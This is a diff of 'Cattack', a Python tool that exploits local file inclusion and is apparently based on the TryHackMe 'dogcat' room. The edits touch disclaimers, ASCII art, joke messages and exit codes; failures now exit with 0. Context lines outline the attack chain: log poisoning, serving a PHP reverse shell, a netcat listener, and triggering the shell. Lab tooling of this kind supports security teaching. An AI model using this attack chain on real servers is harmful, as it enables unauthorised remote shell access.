@@ -8,21 +8,54 @@ This was inspired by the tryhackme "dogcat" room, check it out one day, it's uni
 Intentions:
 This script is aimed at educating. It should only be used for educational purposes, it is meant to teach you to some extent, the theory and practices used to set up LFI exploits. This does not cover everything, and the range of attack is very limited, making it great for education, mostly because it only works on old versions of apache, and you would have to have many misconfigurations. Dispite these benefits, there is still a chance it could be used for harm, and I do not condone or take responsibility for these actions as I am not the one abusing this educational tool.
 
-This script also uses the PHP reverse shell from "Pentestmonkey" All credit to "Pentestmonkey" for the php reverse shell.
+All credit to "Pentestmonkey" for the php reverse shell.
 
 Now that the first disclaimer is over, let's move over to the legal side of things:
 
-This tool may be used for legal purposes only.  Users take full responsibility for any actions performed using this tool.  The author accepts no liability for damage caused by this tool.  If these terms are not acceptable to you, then do not use this tool.
+This tool may be used for legal purposes only.  Users take full responsibility for any actions performed using this tool.
+The author accepts no liability for damage caused by this tool.
+If these terms are not acceptable to you, then do not use this tool.
 
 
-  #####                                          ### 
- #     #   ##   ##### #####   ##    ####  #    # ### 
- #        #  #    #     #    #  #  #    # #   #  ### 
- #       #    #   #     #   #    # #      ####    #  
- #       ######   #     #   ###### #      #  #       
- #     # #    #   #     #   #    # #    # #   #  ### 
-  #####  #    #   #     #   #    #  ####  #    # ### 
-                                                     
+
+
+
+                                                                                                    
+                                                          .................:*+.....                 
+                                                     . ..  ..=@@@@@@@@@@@@@@@#@@...                 
+                                                    .....=@@@@@@@@@@@@@@@@@@@@:.                    
+                                              . .....=%@@@@@@@@@@@@@@@@@@@@@.                       
+                                              ...+@@@@@@@@@@@@@@@@@@@@@@@@@@#                       
+                                           ...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*                       
+                                     ......+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                       
+                                     ....@@@@@@@@@@@@@@@@@@@@@@@@@....@@@@@@.                       
+                                     ..#@@@@@@@@@@@@@@@@@@@@@@@@@%......:#@@@:..                    
+                                     .@@@@@@@@@@@@@@@@@@@@@@@@@@@+..+@@@@@@@@@=.                    
+                                  ...@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=......                    
+                                  ..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-. ... ...                    
+                                  .:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+...                             
+                                  .@@@@@@@@@@@@@@@@@@@@@@@@@@:*#....                                
+                                  -@@@@@@@@@@@@@@@@@@@@@@@@@+. .....                                
+_______________________________...@@@@@@@@@@@@@@@@@@@@@@@@@@:.______________________.                
+                               ..+@@@@@@@@@@@@@@@@@@@@@@@@@@:.                       .               
+                               ..@@@@@@@@@@@@@@@@@@@@@@:@@@@*.                        .              
+                               .+@@@@@@@@@@@@@@@@@@@@@..%@@@@.                         .             
+                               .@@@@@@@@@@@@@@@@@@@@@....@@@@.                          .            
+             *@@%.....      ...-@@@@@@@@@@@@@@@@@@@@@@@%-.@@@@@+....                     .           
+             :@@@@@@+.... .:+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...                      .          
+             ...#@@@@@@@@@@@@@@@=....::----------::::::::....:::....                       .         
+                  ...:-===:...                                                              .        
+                  ............                                                               .       
+..............................................................................................
+  #####                                          ###                                          |
+ #     #   ##   ##### #####   ##    ####  #    # ###                                          |
+ #        #  #    #     #    #  #  #    # #   #  ###                                          |
+ #       #    #   #     #   #    # #      ####    #                                           |
+ #       ######   #     #   ###### #      #  #                                                |
+ #     # #    #   #     #   #    # #    # #   #  ###                                          |
+  #####  #    #   #     #   #    #  ####  #    # ###                                          |
+______________________________________________________________________________________________|                                                     
+
 The not-so-subtle LFI exploit, inspired by the dogcat room in tryhackme.com with it's unique LFI vulnerability.
 
 URL: Must be formatted like so: http://192.168.4.145:port (example IP, port is optional)
@@ -82,7 +115,7 @@ php_script = """
 // This program is distributed in the hope that it will be useful,
 // but WITHOUT ANY WARRANTY; without even the implied warranty of
 // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.    Note from the author of Cattack: This software also is distributed in the hope of it being useful, and has no warranty.
+// GNU General Public License for more details.
 //
 // You should have received a copy of the GNU General Public License along
 // with this program; if not, write to the Free Software Foundation, Inc.,
@@ -264,10 +297,10 @@ try:
 
     # Sending the request to poison the logfile
     requests.get(url, params=params, headers=headers)
-    print("Logfile poisoned. How subtle, it's almost as if nothing happened. Absolutely silent. (sarcasm)")
+    print("Logfile poisoned. How subtle, it's almost as if 100 kilos of C4 exploded. Absolutely silent!")
 except Exception as e:
-    print(f"Failed spectacularly. Are you sure you're understanding this?:\n{e}")
-    exit(1)
+    print(f"Failed spectacularly. Are you sure you're understanding this well-documented manual?:\n{e}")
+    exit(0)
 
 print("Launching HTTP server to serve reverse shell payload...")
 http_server_thread = threading.Thread(target=start_http_server)
@@ -287,7 +320,7 @@ try:
     print("Payload delivered with the elegance of a bull in a china shop.")
 except Exception as e:
     print(f"Mission failed. We'll get 'em next time..or maybe not, since your head is stuck in the clouds:\n{e}")
-    exit(1)
+    exit(0)
 
 print("Launching listener for reverse shell...")
 listener_thread = threading.Thread(target=start_nc_listener)
@@ -300,7 +333,6 @@ try:
     print(revshell_url)
     start_revshell(revshell_url)
 except Exception as e:
-    print(f"Well, you almost had it, but something went wrong, open a issue, because this part is not supposed to have errors unless something is very wrong:\n{e}")
-    exit(1)
+    print(f"Well, you almost had it, but you were too busy bragging to your friends instead of double-checking your spelling:\n{e}")
 
 listener_thread.join()
